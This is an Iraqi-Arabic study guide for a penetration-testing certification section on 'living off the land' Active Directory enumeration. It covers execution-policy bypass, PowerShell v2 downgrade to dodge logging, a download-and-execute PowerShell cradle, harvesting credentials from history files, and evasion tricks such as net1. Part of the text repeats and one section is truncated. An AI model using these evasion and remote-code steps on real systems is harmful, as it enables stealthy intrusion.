🟢 المرحلة 0: Big Picture — ليش هذا الموضوع موجود أصلاً؟

⚠️ تخيل وياي هذا المشهد: أنت عميل سري، ومهمتك تتسلل لمبنى حكومي شديد الحراسة. إذا حاولت تجيب وياك أسلحتك، معداتك، وأدواتك الخاصة لفتح الأقفال، جهاز التفتيش (X-Ray) راح يصيدك من الباب وتنفضح. شنو الحل؟ الحل إنك تدخل فارغ اليدين، وتستخدم الأشياء الموجودة داخل المبنى كأدوات الك: تستخدم قلم الرصاص كأداة لفتح القفل، تستخدم راديو الحارس للتنصت، وتستخدم طابعة الشركة حتى تطبع الخرائط.

هذا بالضبط هو مفهوم الـ "Living Off the Land" (العيش على ما تنتجه الأرض) أو نختصرها بـ (LotL) في عالم الأمن السيبراني.

ليش هذا الخلل أو هاي التقنية موجودة؟

الشركات اليوم صارت ذكية، وصارت تنصب أنظمة مراقبة وحماية مرعبة مثل أنظمة كشف التسلل (IDS/IPS)، والجدران النارية (Firewalls)، والـ EDR (مثل CrowdStrike و Windows Defender). هاي الأنظمة مدربة تدريب قاسي إنها تصيد الأدوات الخبيثة. يعني أول ما ترفع أداة مثل BloodHound أو Mimikatz على سيرفر الضحية، الـ Antivirus راح يصرخ ويبلغ الـ Blue Team، وتنطرد من الشبكة بثواني.

لكن، المشكلة الجوهرية (الجذر) هي: النظام نفسه (Windows و Active Directory) يحتاج أدوات حتى يشتغل! الـ Sysadmin (مدير النظام) يحتاج أدوات حتى يدير الشبكة، يفحص الأخطاء، ويقرأ بيانات المستخدمين. ما يقدر الـ Antivirus يمنع مدير النظام من استخدام أدوات الويندوز الأصلية. وهنا يجي دورك كـ متبني هجوم (Red Teamer). إنت راح تستخدم برامج الويندوز الأصلية (اللي النظام يثق بيها ١٠٠٪) حتى تسوي عمليات الاستطلاع (Enumeration).

وين يظهر هذا بالواقع؟

كل عصابات الـ Ransomware (برامج الفدية) ومجموعات الـ APT (القراصنة المدعومين من دول) يستخدمون هجمات LotL. يجبرون النظام إنه يسلمهم معلوماته باستخدام أدواته الخاصة.

وين هذا السكشن يقع بخريطة CPTS؟

احنا هسة في مرحلة "ما بعد الاختراق الأولي" (Post-Compromise Enumeration). يعني أنت حصلت على وصول لجهاز (Foothold)، بس هذا الجهاز مراقب بشدة وما تكدر ترفع عليه أدواتك المعتادة.

شنو راح تكون قادر تسوي بعد ما تفهم هالسكشن؟

١. راح تكدر تستكشف الجهاز والشبكة والـ Active Directory بالكامل بدون ما ترفع ولا ملف واحد (Zero file drop).

٢. راح تتعلم شلون تخدع أنظمة المراقبة (مثل الـ PowerShell Logging) وتتحرك مثل الشبح.

٣. راح تستخدم لغة الـ LDAP وأدوات الـ WMI كأنك مدير نظام حقيقي.

🔵 المرحلة 1: خريطة المفاهيم

هنا راح نفلتر كل المصطلحات التقنية المزعجة ونبسطها للعراقي:

Living Off the Land (LotL) (العيش على موارد النظام)

- شنو يعني؟ يعني بدل ما تجيب أسلحتك وياك (أدوات الاختراق)، تستخدم أدوات النظام نفسه ضده. يعني تضرب الويندوز بالويندوز.
    
- وين يظهر؟ كمفهوم عام يطلق على استخدام أدوات مثل PowerShell, WMI, CMD.
    
- مثال: بدل ما تنزل برنامج port scanner، تستخدم أمر موجود بالويندوز يفحص المنافذ.
    

Environment Variables (متغيرات البيئة)

- شنو يعني؟ هي مثل "صناديق معلومات" الويندوز يخليها جاهزة ومفتوحة حتى البرامج تعرف وين تشتغل. مثلاً صندوق مكتوب عليه "اسم المستخدم"، وصندوق مكتوب عليه "مجلد البرامج".
    
- وين يظهر؟ بأوامر الـ CMD أو الـ PowerShell (مثل %USERNAME% أو $env:APPDATA).
    
- مثال: كأنما واحد يسألك "وين عنوانك؟" فتكله "اسأل بطاقتي الموحدة". المتغير هو البطاقة اللي بيها معلوماتك الثابتة.
    

Execution Policy (سياسة التنفيذ بـ PowerShell)

- شنو يعني؟ هاي مو ميزة أمان (Security Feature) وإنما ميزة "حماية من الغباء". الويندوز يمنع تشغيل السكربتات حتى لا الموظف العادي يشغل سكربت بالغلط ويخرب حاسبته.
    
- وين يظهر؟ لما تحاول تشغل سكربت .ps1 ويطلعلك إيرور أحمر.
    
- مثال: مثل الباب اللي بي قفل أطفال، يمنع الطفل يفتحه، بس أي شخص بالغ (أو هاكر) يقدر يتجاوزه بسهولة.
    

Script Block Logging (تسجيل الكود البرمجي)

- شنو يعني؟ ميزة بـ PowerShell (من إصدار 3 فما فوق) تسجل حرفياً كل كود أو أمر ينكتب بالشاشة، حتى لو الكود مشفر، راح تفك تشفيره وتسجله بملف (Log) حتى المدافع يقرأه بعدين.
    
- وين يظهر؟ بـ Event Viewer الخاص بالويندوز (Event ID 4104).
    
- مثال: كأنما اكو كاميرا مراقبة مسلطة على الكيبورد مالتك، كل زر تضغطه يتسجل بالفيديو.
    

Downgrade Attack (هجوم خفض الإصدار)

- شنو يعني؟ إذا النظام بي ميزة حماية جديدة (مثل الكاميرا اللي فوك)، أنت تجبر النظام يشتغل بنسخة قديمة ما جانت بيها هاي الكاميرا أصلاً!
    
- وين يظهر؟ لما نستدعي powershell إصدار 2 بدل 5.
    
- مثال: إذا سيارتك الحديثة بيها GPS يراقب سرعتك، أنت تبدل سيارتك بسيارة موديل 1990 حتى محد يكدر يتبعك.
    

WMI (Windows Management Instrumentation)

- شنو يعني؟ هذا "العقل المدبر" لإدارة أجهزة الويندوز. لغة وبروتوكول يستخدمه مدراء النظام حتى يسحبون معلومات أو ينفذون أوامر على آلاف الأجهزة بالشبكة دفعة وحدة.
    
- وين يظهر؟ باستخدام أمر `wmic` بالشاشة السوداء.
    

LDAP Filtering (فلترة البحث ببروتوكول LDAP)

- شنو يعني؟ لما تدور على شي بـ Active Directory، ما تكدر تبحث مثل جوجل. لازم تكتب لغة بحث خاصة تشبه المعادلات، حتى تصفي النتائج.
    
- وين يظهر؟ بأوامر مثل `dsquery`، وتشوفها بشكل رموز غريبة مثل `(objectClass=user)`.
    
- مثال: كأنما تروح لدائرة النفوس وتكللهم: "أريد ملف كل شخص (ذكر) AND (عمره فوق الـ ٣٠) NOT (متزوج)".
    

Bitmask / OID (قناع البت / معرف الكائنات)

- شنو يعني؟ بالويندوز، خصائص اليوزر (مثل: الباسورد ما ينتهي، أو الحساب مقفول) ما تنخزن كنصوص، تنخزن كأرقام. الـ Bitmask هو الرقم السري اللي يمثل هاي الخاصية، والـ OID هو القاعدة اللي تترجم هذا الرقم.
    
- وين يظهر؟ بالبحث المتقدم بالـ AD.
    
- مثال: بدل ما النظام يكتب "هذا اليوزر ما يحتاج باسورد"، يكتب الرقم "32". وإنت لازم تبحث عن الرقم 32.

🔷 التقنية ١: استكشاف الجهاز الأساسي (Env Commands)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

أول ما تكسر باب وتدخل لغرفة ظلمة، أول شي تسويه هو تشعل الضوه وتلتفت يمنى ويسرى حتى تعرف أنت وين. هاي الأوامر هي الضوه مالتك. تنطيك معلومات: شسم هاي الحاسبة؟ شنو نظامها؟ وين ملفاتها؟ وشنو التحديثات اللي نازلة عليها؟

🎭 التشبيه:

تخيل نفسك صحيت من غيبوبة بغرفة مستشفى. أول الأسئلة اللي تسألها: أنا منو؟ شنو اسم المستشفى؟ شنو تاريخ اليوم؟ وأي دكتور يتابع حالتي؟ هاي الأوامر تسأل نفس الأسئلة للكمبيوتر.

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

الويندوز نظام معقد جداً وبي آلاف الملفات والمسارات. بدل ما البرامج تقعد تدور وين مجلد الـ Users، الويندوز يوفر (متغيرات بيئة - Environment Variables) جاهزة، تسحبها وتعرف الجواب بثانية. أما مسألة معرفة التحديثات (Hotfixes)، فهاي مهمة جداً إلك كهاكر، لأن إذا عرفت إن النظام ناقصه تحديث معين، تكدر تضربه بثغرة قديمة وترفع صلاحياتك (Privilege Escalation).

🔧 الأوامر:

DOS

```
systeminfo
echo %USERDOMAIN%
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

💬 شرح الـ flags:

- الكلمة `systeminfo` تجمعلك الكلاوات كلها بمكان واحد: نوع المعالج، إصدار الويندوز، اسم الجهاز.
    
- المتغير `%USERDOMAIN%` يقولك أنت تابع لأي نطاق (Domain).
    
- الكلمة `qfe` بداخل الـ wmic تعني (Quick Fix Engineering) وهو الاسم القديم لتحديثات الويندوز.
    

❓ الـ "بس ليش؟"

- "ليش أستخدم أوامر منفصلة إذا systeminfo ينطيني كل شي؟"
    
    سؤال ذكي. الـ `systeminfo` يجيب بيانات هواي وممكن يطول، ومرات أنظمة المراقبة (EDR) تعتبر تشغيل `systeminfo` مؤشر على وجود هاكر لأن الموظف العادي ما يكتبه. الأوامر الصغيرة مثل `echo %USERDOMAIN%` مستحيل تلفت الانتباه.
    

⏸️ نقطة توقف: هسة إحنا عرفنا اسم الجهاز والنظام والتحديثات اللي بي. صار وقت نتعمق ونستخدم السلاح الأقوى: PowerShell.

🔷 التقنية ٢: ترويض PowerShell والبحث بالقمامة (History)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

الباور شيل (PowerShell) هو أداة سحرية تكدر تسوي بيها أي شي بالويندوز. بس مرات النظام يمنعك تنفذ سكربتات، أو تحتاج تعرف الموظف اللي قبلك شنو كتب أوامر (لأن ممكن يكون كاتب باسورد مالته بالغلط بالشاشة).

🎭 التشبيه:

الـ Execution Policy هو مثل حارس أمن مول يگلك "ممنوع تدخل لابس شورت". أنت ببساطة تكله "أني مو زبون، أني عامل صيانة" (تغير الـ Scope)، ويفوتك. أما الـ History فهو مثل تفتيش سلة المهملات مال مكتب موظف، ممكن تلگى ورقة مكتوب عليها الباسورد!

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

الـ Execution Policy صُمم لمنع المستخدم العادي من النقر المزدوج على سكربت خبيث بالخطأ. هو مو جدار حماية حقيقي، هو فقط حماية ضد الأخطاء غير المقصودة. لذلك مايكروسوفت نفسها تسمحلك تتجاوزه إذا حددت إن التجاوز يكون فقط لهذي الجلسة (Process) حتى ما يتغير إعداد النظام الدائمي ومحد يحس بيك.

🔧 الأوامر:

PowerShell

```
Set-ExecutionPolicy Bypass -Scope Process
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL');"
```

💬 شرح الـ flags:

- `Bypass`: يعني غلس، لا تمنع أي سكربت.
    
- `-Scope Process`: يعني هذا التغيير خليه فقط بهاي النافذة اللي فاتحها، من أسدها يرجع كلشي طبيعي (مهم جداً للتخفي).
    
- `-nop`: يعني No Profile، شغل الباور شيل بسرعة وبدون ما تحمل إعدادات اليوزر (حتى لا تضرب عليك سكربتات قديمة).
    
- `iex`: اختصار لـ Invoke-Expression، يعني "نفذ هذا النص كأنه كود".
    

📤 الـ Output المتوقع (لملف الهيستوري):

PowerShell

```

net use X: \\fileserver\share /user:admin P@ssw0rd123!
```

💡 بالعراقي البسيط:

الباور شيل الحديث (نسخة 5 فما فوق) بي كاميرا مراقبة قوية جداً تسجل كل كود تكتبه. هسة إحنا نريد نشتغل بدون ما هاي الكاميرا تصورنا. شنسوي؟ نرجع بالزمن! نشغل نسخة باور شيل قديمة (نسخة 2) اللي هي أصلاً ما بيها كاميرا.

🎭 التشبيه:

🔷 التقنية ٤: فحص الدفاعات و "هل أنا وحدي؟" (Defenses & qwinsta)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

قبل ما تبدأ تسوي ضجة، لازم تعرف شغلتين: هل الـ Antivirus شغال ويفحص الملفات؟ وهل اكو موظف أو أدمن ثاني مسجل دخول بهاي الحاسبة بنفس اللحظة؟ إذا اكو أحد، وتطلعله شاشة سوداء فجأة، راح يطفي الحاسبة ونفقد اختراقنا.

🎭 التشبيه:

مثل اللص اللي يدخل بيت. أول شي يباوع على جهاز الإنذار (Defender) هل هو معلوگ لو مطفي؟ وثاني شي يتسمع، هل اكو أحد نايم بالغرفة لو البيت فارغ؟ (qwinsta).

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

الـ `qwinsta` (Query Window Station) أداة قديمة بالويندوز تجيبلك الجلسات (Sessions) المفتوحة. أما الـ `Get-MpComputerStatus` فهو يسحب كل إعدادات الـ Windows Defender الحالية من نواة النظام حتى تعرف بالضبط متى آخر مرة صار فحص، وهل ميزة الحماية بالوقت الفعلي (Real-time protection) شغالة لو لا.

🔧 الأوامر:

PowerShell

```
qwinsta
sc query windefend
Get-MpComputerStatus
```

💬 شرح الـ flags:

- `sc query`: يسال خدمة الويندوز (Service) عن حالتها هل هي (Running) لو (Stopped).
    
- `Get-MpComputerStatus`: يجيبلك تفاصيل الـ Defender المملة.
    

🔍 كيف تقرأ الـ Output؟

بالنسبة لـ qwinsta، دور على السطور اللي حالتها `Active`. إذا شفت غيرك `Active`، اتصرف بحذر شديد!

بالنسبة للـ Defender، أهم سطر هو `RealTimeProtectionEnabled`. إذا كان True، يعني أي ملف خبيث تنزله راح ينحذف بثانية.

🔷 التقنية ٥: استكشاف الشبكة (Network Recon)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

أنت هسة محبوس داخل حاسبة، تريد تعرف هاي الحاسبة المن تكدر توصل؟ هل تكدر توصل لسيرفر قواعد البيانات؟ هل هي متصلة بشبكة ثانية مخفية؟ الجواب نلقاه بذاكرة الحاسبة نفسها (جدول التوجيه وجدول الـ ARP).

🎭 التشبيه:

تخيل أنت خطفت تليفون شخص، وتريد تعرف منو أصدقاءه اللي يحاجيهم دايماً. ما تروح تسأل شركة الاتصالات، بس تفتح "سجل المكالمات الأخير" بالتليفون! هذا هو الـ ARP table.

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

أي حاسبة بالشبكة حتى تحاجي حاسبة ثانية، لازم تعرف الـ MAC Address مالتها. فتحفظه بجدول مؤقت اسمه `ARP Cache`. إذا قرينا هذا الجدول، راح نعرف كل الأيبيهات (IPs) اللي هاي الحاسبة تواصلت وياها مؤخراً. أما ה`Routing Table` فهو الخريطة اللي تكول للحاسبة "إذا تريدين تروحين لشبكة 10.10.0.0، اطلعي من هذا الباب". هاي الخريطة تنطيك أفكار وين تكدر تسوي Pivot (انتقال لشبكة أعمق).

🔧 الأوامر:

PowerShell

```
arp -a
route print
```

📤 الـ Output المتوقع (للـ route print):

Plaintext

```
Network Destination        Netmask          Gateway       Interface
      0.0.0.0          0.0.0.0       172.16.5.1      172.16.5.25
   10.129.0.0      255.255.0.0         On-link    10.129.201.234
```

🔍 كيف تقرأ الـ Output؟

هنا السر! ركز على السطر الثاني. الحاسبة متصلة بشبكتين: شبكة `172.16.x.x` وشبكة `10.129.x.x`. هاي كنز! معناه أنت هسة بهذي الحاسبة تمثّل "جسر" لشبكة داخلية ثانية (10.129) قد تكون معزولة عن العالم الخارجي.

🔷 التقنية ٦: الاستجواب بـ WMI وأوامر Net

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

الـ Active Directory هو القلب مال الشركة. إحنا نريد نسأله: منو الأدمينية؟ شنو الجروبات الموجودة؟ منو متصل وين؟ نكدر نسوي هذا الشيء بأدوات بسيطة مثل `net` أو أداة معقدة مثل `wmic`.

🎭 التشبيه:

الـ `net` commands مثل واحد يروح يسأل استعلامات الشركة: "منو مديركم؟ منو يشتغل بالحسابات؟". أما الـ WMI فهو مثل واحد اخترق نظام الاتصالات مال الشركة وكام يسحب ملفات الـ HR كلها عن بُعد.

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

الـ Domain Controllers (سيرفرات الإدارة) مصممة حتى تجاوب على استفسارات المستخدمين العاديين. يعني أي يوزر (حتى لو موظف بسيط) من حقه يطلب قائمة بكل المستخدمين بالشبكة! الويندوز يوفر برنامج `net.exe` حتى يتواصل ويه الـ Domain ويسحب هاي البيانات.

🔧 الأوامر:

DOS

```
net group /domain
net user Administrator /domain
wmic ntdomain get Caption,DomainControllerAddress
```

💬 شرح الـ flags:

- `/domain`: هذا السويتش السحري. إذا ما كتبته، راح يبحث بالحاسبة المحلية (Local). إذا كتبته، الحاسبة راح تخابر الـ Domain Controller وتجيبلك المعلومات من الشبكة كلها.
    

❓ الـ "بس ليش؟"

- "السكشن ذكر حيلة اسمها `net1` بدال `net`، ليش؟"
    
    الـ EDR (أنظمة الحماية) ذكية، مسوية قاعدة: "إذا شفت أداة `net.exe` اشتغلت، اضرب جرس إنذار". الهاكرز اكتشفوا إن مايكروسوفت خالة نسخة احتياطية من الأداة اسمها `net1.exe` تسوي نفس الشغل بالضبط! والـ EDR الغبي مرات ينسى يراقب `net1` ويراقب بس `net`. خدعة بسيطة بس فعالة جداً.
    

⏸️ نقطة توقف: استجوبنا الـ AD بالأساسيات. هسة راح نتعلم لغة الـ AD الأصلية: LDAP.

🔷 التقنية ٧: البحث العميق بـ Dsquery و LDAP

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 بالعراقي البسيط:

هذي أقوى أداة بالسكشن. بدل ما نسأل أسئلة عامة (منو اليوزرات؟)، نكدر نسأل أسئلة خطيرة ومحددة جداً: "جيبلي كل اليوزرات اللي الباسورد مالتهم ما ينتهي أبداً ومقفول حسابهم". هذا البحث يتم بأداة مخفية بالويندوز اسمها `dsquery`.

🎭 التشبيه:

بدل ما تطلب دليل التليفونات وتقراه صفحة صفحة، كأنما عندك داتابيس تكدر تسوي بيها فلترة: جيبلي بس الأشخاص اللي ساكنين ببغداد، أعمارهم ٢٠، واسمهم يبدي بحرف ميم.

🔬 ليش يعمل هيج؟ (المبدأ الجوهري):

الـ Active Directory مبني على بروتوكول اسمه LDAP (Lightweight Directory Access Protocol). كل شي بالـ AD هو عبارة عن Object (كائن) وبي Attributes (خصائص). بعض الخصائص المهمة جداً (مثل إعدادات الحماية مال اليوزر) مخزونة بحقل واحد اسمه `userAccountControl`. هذا الحقل ما يكتبلك "الحساب مقفول"، بل يخزن رقم يجمع كل الحالات (Bitmask). هنا يجي دور الـ LDAP filters اللي تستخدم أرقام سحرية (OIDs) حتى تفك تشفير هذا الرقم وتلگى هدفك.

🔧 الأمر الجبار:

PowerShell

```
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=8192))" -attr sAMAccountName
```

💬 شرح الـ فلاتر (LDAP Magic):

- `*`: يعني ابحث بكل الـ Directory.
    
- `&`: يعني (AND)، كل الشروط اللي بين الأقواس لازم تتحقق.
    
- `objectCategory=person` و `objectClass=user`: دا أكوله ديربالك، أريد فقط حسابات يوزرات حقيقية (مو حاسبات ولا طابعات).
    
- `userAccountControl:1.2.840.113556.1.4.803:=8192`: هذا هو السحر. الرقم `1.2.840.113556.1.4.803` (الـ OID) يكول للـ AD: "افتحلي صندوق الـ UAC، وشوفلي البتات (Bits) اللي بي". الرقم `8192` يمثل يوزر عنده مشكلة معينة أو صلاحية معينة (هنا تمثل حساب Domain Controller). إذا الرقم طابق، جيبلي هذا اليوزر.
    
- `-attr sAMAccountName`: يعني من تلگى اليوزر، لا تجيبلي كل معلوماته، جيبلي بس اسمه المستعار (Username).
    

📊 ملخص ما تعلمناه ببحث الـ LDAP:

|**المفهوم / الرمز**|**ما يعني**|**متى تستخدمه**|
|---|---|---|
|`&`|AND (كل الشروط لازم تطابق)|لما تريد تضيق البحث بشكل كبير.|
|`\|`|OR (أي شرط يكفي)|لما تبحث عن حساب من نوعين مختلفين.|
|`!`|NOT (استثناء)|لما تريد كل اليوزرات _ما عدا_ المقفولين.|
|`1.2.840.113556.1.4.803`|OID للمطابقة الدقيقة|لما تبحث عن خاصية محددة بالضبط (Bitwise AND).|

🔴 المرحلة 4: ما لا يقوله السكشن

هنا الحجي المبطن اللي لازم تعرفه كـ Pentester حقيقي، لأن HTB يشرحلك الأداة بس مرات ما يگلك مشاكلها الواقعية.

🕳️ الثغرات في شرح السكشن (اللي ما ذكروها الك):

1. **الـ Noise (الضجيج) مال `net` commands:** السكشن يگلك استخدم `net user /domain`. بس ما يگلك إنه بمجرد أن تضغط Enter، حاسبتك راح تفتح اتصال (SMB/RPC) مباشر مع الـ Domain Controller! ببيئات الـ Enterprise المراقبة، هذا الاتصال من حاسبة موظف عادي (مثلاً بقسم المبيعات) إلى الـ DC، وبكميات كبيرة، راح يخلي الـ SOC (فريق الحماية) يشتغل عندهم إنذار أحمر فوراً. هاي الحركة مو هادئة (Stealthy) مثل ما تتخيل.
    
2. **خدعة `net1` انتهت صلاحيتها:** السكشن يذكرلك `net1` كـ Workaround (حيلة). بالواقع، وبسنة ٢٠٢٤، أغلب أنظمة الـ EDR الحديثة (مثل CrowdStrike و Defender for Endpoint) صاروا يسوون Block للـ `net1` بالضبط مثل ما يسوون للـ `net`. لا تعتمد عليها كمنقذ دائم.
    
3. **جريمة خفض الإصدار (Downgrade):** السكشن يگلك نزل إصدار الـ PowerShell لـ 2 حتى ما تتسجل أوامرك. بس اللي ما ركز عليه كفاية: عملية كتابة `powershell -version 2` بحد ذاتها راح تولد Event بالويندوز (Event ID 400). مجرد ظهور هذا الحدث هو Indicator of Compromise (IoC) خطير جداً. الـ Sysadmin الذكي راح يسأل: "ليش حاسبة الموظف فجأة شغلت الباور شيل موديل ٢٠٠٩؟".
    

⚠️ الـ Gotchas عند تطبيق هذا بالـ Lab:

- **الصلاحيات:** مرات تشغل أمر `dsquery` ويطلعلك Error. هذا مو لأن الأداة خربانة، بل لأن الـ User اللي أنت مخترقه ماعنده صلاحية (Query) على الـ OU المعينة بالـ Active Directory (بعض الشركات تقفل هاي الصلاحية وما تخليها Default).
    
- **الـ WMI بطيء:** إذا استخدمت `wmic` حتى تسحب لستة بروسسات من حاسبة عن بعد بالشبكة، ممكن يطول أو يعلك (Hang) إذا الحاسبة بيها Firewall قوي.
    

🔗 ربط بسكاشن أخرى:

موضوع الـ LDAP Filtering (أرقام الـ OID والـ Bitmasks) اللي أخذناه بنهاية السكشن، راح ترجعله بشكل مخيف وموسع بموديول "BloodHound" وموديول "Active Directory LDAP". اللي تعلمته هنا كـ Command Line راح تشوفه هناك كـ Graph مرئي.

🌍 السياق الحقيقي (Real Pentest Context):

بالحياة الواقعية، من تستلم Shell، أول نصيحة: **لا تسوي شي لمدة ١٠ دقائق!** استخدم `qwinsta` و `systeminfo` فقط. اقرأ وين أنت. لا تبدأ تسوي `net user /domain` وأنت ما تدري هل الـ Defender شغال بوضع الـ Aggressive لو لا. הـ LotL هو فن الهدوء.

🏆 النصيحة الذهبية لـ CPTS Exam:

بامتحان الـ CPTS، مرات راح توگع بحاسبة ما تكدر تنزل بيها BloodHound أو SharpHound لأن الـ AV ياكلها فوراً. هنا راح تضطر تعتمد ١٠٠٪ على `dsquery` و `wmic` حتى تطلع الـ Domain Admins وتعرف طريقك للروت. لا تستهين بهاي الأدوات، هي اللي راح تفكلك العقدة بالامتحان.

✅ Back: لخفض إصدار PowerShell إلى النسخة 2 (Downgrade Attack) لتجنب ميزة تسجيل الأكواد (Script Block Logging) التي أضيفت في النسخة 3 وما فوق.

📄 ورقة غش: Living Off the Land - AD Enumeration

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 هدف هذا السكشن بجملة:

استخدام أدوات الويندوز الأصلية لجمع معلومات عن الجهاز والشبكة والـ AD بصمت، بدون رفع أي برامج خبيثة.

⚔️ خوارزمية التطبيق (خطوة بخطوة عند الدخول لجهاز جديد):

1. **الهدوء:** من أنا وأين؟ (`systeminfo` / `echo %USERDOMAIN%`)
    
2. **السلامة:** هل أنا وحدي؟ هل AV شغال؟ (`qwinsta` / `Get-MpComputerStatus`)
    
3. **التخفي:** تجاوز السياسات وإيقاف التسجيل (`Bypass` / `Downgrade to v2`).
    
4. **البحث بالقمامة:** فحص `ConsoleHost_history.txt`.
    
5. **استكشاف الشبكة:** من حولي؟ (`arp -a` / `route print`).
    
6. **الهجوم المباشر:** استجواب الـ AD (`net` / `wmic` / `dsquery`).
    

📐 جدول الأوامر الأساسية:

|**الهدف**|**الأمر**|**ملاحظة**|
|---|---|---|
|حالة الحماية|`Get-MpComputerStatus`|افحص `RealTimeProtectionEnabled`.|
|جلسات المستخدمين|`qwinsta`|خطير جداً العمل إذا كان الـ Admin `Active`.|
|استكشاف الشبكات|`route print`|ابحث عن مسارات لشبكات غير معروفة (Pivoting).|
|تجاوز الـ Logging|`powershell -v 2`|سيولد Log واحد عند التشغيل، ثم صمت تام.|
|استعلام WMI|`wmic qfe get Caption...`|لمعرفة التحديثات للبحث عن ثغرات PrivEsc.|
|جروبات الدومين|`net group /domain`|احذر: يولد ترافيك مباشر نحو الـ DC.|
|بحث متقدم AD|`dsquery * -filter "..."`|استخدم LDAP filters مع الـ OIDs السحرية.|

🚨 الفخوخ الخاصة بهذا السكشن:

❌ الاعتماد المطلق على `net1` وتوقع أنه لن يُكشف (الأنظمة الحديثة تكشفه).

❌ تنفيذ `net user /domain` بكثرة من جهاز لا يفترض أن يقوم بذلك (تنبيه الـ SOC).

❌ تجاهل أمر `qwinsta` وطرد مدير النظام من جلسته بالخطأ أثناء الاختراق.

💡 Golden Tip:

دائماً اسحب الـ PowerShell History أول شيء! ستتفاجأ كم مرة يكتب مدراء النظام كلمات المرور أو مسارات مخفية داخل الشاشة السوداء والتي تبقى محفوظة في الـ `ConsoleHost_history.txt`.

🟢 المرحلة 0: Big Picture — ليش هذا الموضوع موجود أصلاً؟

⚠️ تخيل وياي هذا المشهد: أنت عميل سري، ومهمتك تتسلل لمبنى حكومي شديد الحراسة. إذا حاولت تجيب وياك أسلحتك، معداتك، وأدواتك الخاصة لفتح الأقفال، جهاز التفتيش (X-Ray) راح يصيدك من الباب وتنفضح. شنو الحل؟ الحل إنك تدخل فارغ اليدين، وتستخدم الأشياء الموجودة داخل المبنى كأدوات الك: تستخدم قلم الرصاص كأداة لفتح القفل، تستخدم راديو الحارس للتنصت، وتستخدم طابعة الشركة حتى تطبع الخرائط.

هذا بالضبط هو مفهوم الـ "Living Off the Land" (العيش على ما تنتجه الأرض) أو نختصرها بـ (LotL) في عالم الأمن السيبراني.

ليش هذا الخلل أو هاي التقنية موجودة؟

الشركات اليوم صارت ذكية، وصارت تنصب أنظمة مراقبة وحماية مرعبة مثل أنظمة كشف التسلل (IDS/IPS)، والجدران النارية (Firewalls)، والـ EDR (مثل CrowdStrike و Windows Defender). هاي الأنظمة مدربة تدريب قاسي إنها تصيد الأدوات الخبيثة. يعني أول ما ترفع أداة مثل BloodHound أو Mimikatz على سيرفر الضحية، الـ Antivirus راح يصرخ ويبلغ الـ Blue Team، وتنطرد من الشبكة بثواني.

لكن، المشكلة الجوهرية (الجذر) هي: النظام نفسه (Windows و Active Directory) يحتاج أدوات حتى يشتغل! الـ Sysadmin (مدير النظام) يحتاج أدوات حتى يدير الشبكة، يفحص الأخطاء، ويقرأ بيانات المستخدمين. ما يقدر الـ Antivirus يمنع مدير النظام من استخدام أدوات الويندوز الأصلية. وهنا يجي دورك كـ متبني هجوم (Red Teamer). إنت راح تستخدم برامج الويندوز الأصلية (اللي النظام يثق بيها ١٠٠٪) حتى تسوي عمليات الاستطلاع (Enumeration).

وين يظهر هذا بالواقع؟

كل عصابات الـ Ransomware (برامج الفدية) ومجموعات الـ APT (القراصنة المدعومين من دول) يستخدمون هجمات LotL. يجبرون النظام إنه يسلمهم معلوماته باستخدام أدواته الخاصة.

وين هذا السكشن يقع بخريطة CPTS؟

احنا هسة في مرحلة "ما بعد الاختراق الأولي" (Post-Compromise Enumeration). يعني أنت حصلت على وصول لجهاز (Foothold)، بس هذا الجهاز مراقب بشدة وما تكدر ترفع عليه أدواتك المعتادة.

شنو راح تكون قادر تسوي بعد ما تفهم هالسكشن؟

١. راح تكدر تستكشف الجهاز والشبكة والـ Active Directory بالكامل بدون ما ترفع ولا ملف واحد (Zero file drop).

٢. راح تتعلم شلون تخدع أنظمة المراقبة (مثل الـ PowerShell Logging) وتتحرك مثل الشبح.

٣. راح تستخدم لغة الـ LDAP وأدوات الـ WMI كأنك مدير نظام حقيقي.

🔵 المرحلة 1: خريطة المفاهيم

هنا راح نفلتر كل المصطلحات التقنية المزعجة ونبسطها للعراقي:

Living Off the Land (LotL) (العيش على موارد النظام)

- شنو يعني؟ يعني بدل ما تجيب أسلحتك وياك (أدوات الاختراق)، تستخدم أدوات النظام نفسه ضده. يعني تضرب الويندوز بالويندوز.
    
- وين يظهر؟ كمفهوم عام يطلق على استخدام أدوات مثل PowerShell, WMI, CMD.
    
- مثال: بدل ما تنزل برنامج port scanner، تستخدم أمر موجود بالويندوز يفحص المنافذ.
    

Environment Variables (متغيرات البيئة)

- شنو يعني؟ هي مثل "صناديق معلومات" الويندوز يخليها جاهزة ومفتوحة حتى البرامج تعرف وين تشتغل. مثلاً صندوق مكتوب عليه "اسم المستخدم"، وصندوق مكتوب عليه "مجلد البرامج".
    
- وين يظهر؟ بأوامر الـ CMD أو الـ PowerShell (مثل %USERNAME% أو $env:APPDATA).
    
- مثال: كأنما واحد يسألك "وين عنوانك؟" فتكله "اسأل بطاقتي الموحدة". المتغير هو البطاقة اللي بيها معلوماتك الثابتة.
    

Execution Policy (سياسة التنفيذ بـ PowerShell)

- شنو يعني؟ هاي مو ميزة أمان (Security Feature) وإنما ميزة "حماية من الغباء". الويندوز يمنع تشغيل السكربتات حتى لا الموظف العادي يشغل سكربت بالغلط ويخرب حاسبته.
    
- وين يظهر؟ لما تحاول تشغل سكربت .ps1 ويطلعلك إيرور أحمر.
    
- مثال: مثل الباب اللي بي قفل أطفال، يمنع الطفل يفتحه، بس أي شخص بالغ (أو هاكر) يقدر يتجاوزه بسهولة.
    

